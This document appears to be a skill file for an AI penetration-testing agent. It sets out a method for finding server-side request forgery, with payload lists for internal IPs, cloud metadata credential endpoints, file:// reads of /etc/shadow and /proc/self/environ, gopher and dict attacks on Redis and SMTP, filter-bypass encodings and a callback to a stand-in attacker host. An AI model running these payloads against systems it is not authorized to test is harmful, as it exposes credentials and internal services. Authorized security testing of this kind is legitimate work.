# SKILL: SSRF Testing Methodology

Server-Side Request Forgery (SSRF) occurs when an application can be induced to make HTTP requests to an attacker-specified destination, potentially accessing internal resources or external services on behalf of the server.

## Severity Context

| Impact | Typical Severity |
|--------|------------------|
| Internal network access (AWS metadata, etc.) | Critical |
| Internal service access (Redis, Elasticsearch) | Critical |
| File read via file:// protocol | Critical |
| Port scanning internal network | High |
| Accessing internal-only HTTP services | High |
| Blind SSRF (no response data) | Medium |
| Limited external request (no protocol control) | Low |

---

## Prerequisites

1. ✅ Endpoints triaged with `ssrf` indicator
2. ✅ Parameters containing URLs or URL-like values identified
3. ✅ Understanding of target's infrastructure (cloud provider, internal networks)

---

## Methodology

### Phase A: SSRF Vector Identification

#### Step A1: Identify URL-Accepting Parameters

Search for parameters that accept URLs or URL-like values:

```
HIGH CONFIDENCE - Parameter names:
- url, uri, link, src, href
- redirect, callback, return, next, target
- proxy, fetch, load, request, retrieve
- webhook, endpoint, destination
- image_url, avatar_url, icon_url
- feed_url, rss_url, import_url

MEDIUM CONFIDENCE - Parameter names:
- path, file, page, document
- domain, host, server
- site, location, reference

CONTEXT CLUES:
- Webhooks functionality
- URL preview/unfurling
- File import from URL
- Image fetching
- PDF generation from URL
- Any "fetch from URL" feature
```

#### Step A2: Identify URL-Like Values

Even without obvious parameter names, look for URL patterns:

```
In query params:
?param=http://example.com
?param=https://example.com
?param=//example.com (protocol-relative)

In request bodies:
{"url": "http://..."}
{"config": {"endpoint": "http://..."}}

In headers:
X-Forwarded-Host: attacker.com
Host: manipulated-value

URL-encoded:
?param=http%3A%2F%2Fexample.com
```

#### Step A3: Map SSRF Endpoints

For each identified endpoint:

```
Endpoint: POST /api/webhook/test
Parameter: url (in JSON body)
Observed Values: https://external-service.com/callback
Context: Webhook configuration testing
Risk: Server will make request to provided URL
```

---

### Phase B: Basic SSRF Testing

#### Test B1: External Callback Test

```
Purpose: Confirm server makes outbound requests

Setup:
1. Set up callback receiver (Burp Collaborator, webhook.site, or own server)
2. Note the unique callback URL

Test:
1. Replace URL parameter with callback URL
2. Submit request
3. Check callback receiver for incoming request

Evidence:
- Request from TARGET'S IP to your callback
- User-Agent and other headers from server
- Timing correlation with your request
```

#### Test B2: Internal IP Access

```
Purpose: Test if internal IPs are accessible

Test URLs:
- http://127.0.0.1/
- http://localhost/
- http://127.0.0.1:80/
- http://127.0.0.1:8080/
- http://127.0.0.1:443/
- http://[::1]/  (IPv6 localhost)
- http://0.0.0.0/

For each:
1. Submit as URL parameter
2. Check response for:
   - Different content than normal error
   - Internal service responses
   - Connection timing differences
```

#### Test B3: Internal Network Ranges

```
Purpose: Probe internal network

Test URLs:
- http://10.0.0.1/
- http://172.16.0.1/
- http://192.168.0.1/
- http://192.168.1.1/
- Common internal IPs for routers, services

Also try:
- Incrementing last octet (10.0.0.1, 10.0.0.2, ...)
- Common ports on internal IPs
```

#### Test B4: Cloud Metadata Services

```
Purpose: Access cloud provider metadata (CRITICAL if successful)

AWS:
- http://169.254.169.254/latest/meta-data/
- http://169.254.169.254/latest/user-data/
- http://169.254.169.254/latest/meta-data/iam/security-credentials/

GCP:
- http://metadata.google.internal/computeMetadata/v1/
- http://169.254.169.254/computeMetadata/v1/
(Requires header: Metadata-Flavor: Google)

Azure:
- http://169.254.169.254/metadata/instance
(Requires header: Metadata: true)

DigitalOcean:
- http://169.254.169.254/metadata/v1/

These endpoints expose:
- IAM credentials
- API keys
- Instance configuration
- Network information
```

---

### Phase C: Filter Bypass Techniques

If basic tests are blocked, try bypasses:

#### Bypass C1: IP Address Formats

```
Decimal:
http://2130706433/ (127.0.0.1 as decimal)

Octal:
http://0177.0.0.1/ (127 in octal)

Hex:
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/

Mixed:
http://127.1/
http://127.0.1/

IPv6:
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

#### Bypass C2: DNS Rebinding

```
Purpose: Bypass IP-based blocklists via DNS

Setup:
1. Control a domain
2. Configure DNS to initially resolve to allowed IP
3. Then quickly change to internal IP

Or use:
- rebind.network services
- Short TTL DNS records
```

#### Bypass C3: URL Parsing Confusion

```
Userinfo confusion:
http://allowed.com@internal.server/

Fragment confusion:
http://allowed.com#@internal.server/

Backslash confusion (Windows):
http://allowed.com\@internal.server/

Unicode normalization:
http://ⓔⓧⓐⓜⓟⓛⓔ.com/

URL encoding:
http://%31%32%37%2e%30%2e%30%2e%31/
```

#### Bypass C4: Protocol Variations

```
If only http:// is blocked:

- https://127.0.0.1/
- gopher://127.0.0.1:25/
- dict://127.0.0.1:11211/
- file:///etc/passwd
- ftp://internal-ftp/
- ldap://internal-ldap/
```

#### Bypass C5: Redirect Chains

```
Purpose: Use allowed external site to redirect to internal

Setup:
1. Host redirect on allowed domain
2. Redirect target: internal resource

Test:
http://your-allowed-domain.com/redirect?to=http://127.0.0.1/

The server follows redirects, landing on internal resource
```

#### Bypass C6: DNS Pointing to Internal

```
Purpose: Domain resolves to internal IP

Setup:
1. Create DNS A record: ssrf-test.yourdomain.com → 127.0.0.1
2. Use http://ssrf-test.yourdomain.com/

Server resolves domain → gets internal IP → connects
```

---

### Phase D: Exploitation Depth

If basic SSRF confirmed, test exploitation depth:

#### Test D1: Protocol Support

```
Test which protocols are supported:

http://    - Standard HTTP
https://   - HTTPS
file://    - Local file read
gopher://  - Can send arbitrary data
dict://    - Dictionary protocol
ftp://     - FTP
ldap://    - LDAP
sftp://    - SFTP

file:// tests:
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file://localhost/etc/passwd
```

#### Test D2: Port Scanning

```
Purpose: Enumerate internal services

Method:
1. Request http://127.0.0.1:PORT/
2. Observe response differences:
   - Connection refused: Port closed
   - Connection timeout: Port filtered/no host
   - Response content: Port open
   - Response timing: Different for open vs closed

Common ports:
22, 80, 443, 3306, 5432, 6379, 27017, 9200, 8080, 8443
```

#### Test D3: Internal Service Interaction

```
If internal services accessible:

Redis (6379):
- gopher://127.0.0.1:6379/_PING
- Can execute Redis commands

Memcached (11211):
- dict://127.0.0.1:11211/stats

Elasticsearch (9200):
- http://127.0.0.1:9200/_cluster/health
- http://127.0.0.1:9200/_cat/indices

MongoDB (27017):
- Requires specific protocol

SMTP (25):
- gopher://127.0.0.1:25/_HELO%20...
- Can send emails
```

---

## Evidence Requirements

### External Callback SSRF

```
Finding: SSRF via webhook URL parameter
Severity: High (or Critical if internal access confirmed)

Evidence:

1. Callback server setup:
   - URL: https://callback.attacker.com/ssrf-test-12345
   
2. Request sent:
   POST /api/webhook/test HTTP/1.1
   Content-Type: application/json
   
   {"url": "https://callback.attacker.com/ssrf-test-12345"}

3. Callback received:
   Source IP: 203.0.113.50 (target's server IP)
   User-Agent: Target-Server/1.0
   Timestamp: correlates with request

Burp ID: #XXXX
```

### Internal Access SSRF

```
Finding: SSRF with internal network access
Severity: Critical

Evidence:

1. Request:
   POST /api/fetch HTTP/1.1
   {"url": "http://169.254.169.254/latest/meta-data/"}

2. Response:
   HTTP/1.1 200 OK
   
   ami-id
   ami-launch-index
   hostname
   instance-id
   ...

This confirms access to AWS metadata service.

Burp ID: #XXXX
```

---

## Blind SSRF Testing

When no response content is returned:

### Time-Based Detection

```
Compare response times:
- http://127.0.0.1:80/       → Fast (port open)
- http://127.0.0.1:12345/    → Slow (connection timeout)
- http://10.0.0.1/           → Varies by network

Significant timing differences indicate SSRF working
```

### Out-of-Band Detection

```
Use Burp Collaborator or similar:
1. Provide unique callback URL
2. Monitor for DNS lookups (even if HTTP blocked)
3. Monitor for HTTP/HTTPS requests

DNS-only SSRF still confirms vulnerability
```

### Error-Based Detection

```
Different errors for different conditions:
- "Connection refused" → Port closed, but SSRF worked
- "Host not found" → DNS lookup worked
- "Connection timeout" → Filtering or no route
- "Invalid URL" → URL parsing before SSRF

Error differences reveal SSRF behavior
```

---

## Output Format

Write findings to `output/findings/ssrf.md`:

```markdown
# SSRF Analysis Findings

## Summary
- Endpoints with URL parameters: 8
- SSRF Confirmed: 2
- Blind SSRF Suspected: 1
- Internal Access Achieved: 1 (Critical)

---

## Finding 1: AWS Metadata Access via Image Fetch

**Severity**: Critical
**Endpoint**: POST /api/images/fetch
**Parameter**: image_url

### Description
The image fetching endpoint makes server-side requests to user-provided URLs.
Internal network and AWS metadata service are accessible.

### Evidence

**Request**:
\`\`\`http
POST /api/images/fetch HTTP/1.1
Content-Type: application/json

{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
\`\`\`

**Response** (truncated):
\`\`\`http
HTTP/1.1 200 OK

{
  "role_name": "production-app-role",
  "AccessKeyId": "AKIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
\`\`\`

**Burp ID**: #3456

### Impact
- Full AWS credential exposure
- Potential for cloud account takeover
- Access to all resources the role can access

### Remediation
1. Implement URL allowlist for external fetches
2. Block private IP ranges and metadata IPs
3. Use egress proxy for external requests
4. Disable unnecessary protocols (file://, gopher://)
```

---

## Testing Checklist

```
Identification:
[ ] All URL-accepting parameters identified
[ ] Webhook endpoints documented
[ ] URL preview/unfurl features found
[ ] File import features found

Basic Testing:
[ ] External callback test (Collaborator)
[ ] Localhost access tested
[ ] Internal IP ranges tested
[ ] Cloud metadata tested (AWS, GCP, Azure)

Bypass Testing:
[ ] IP address format variations
[ ] Protocol variations
[ ] URL parsing confusion
[ ] Redirect chains
[ ] DNS pointing to internal

Exploitation:
[ ] Protocol support enumeration
[ ] Port scanning capability
[ ] Internal service interaction
[ ] File read capability

Evidence:
[ ] Callback proof collected
[ ] Internal access documented
[ ] Response content captured
[ ] Burp IDs recorded
[ ] Severity accurately assessed
```
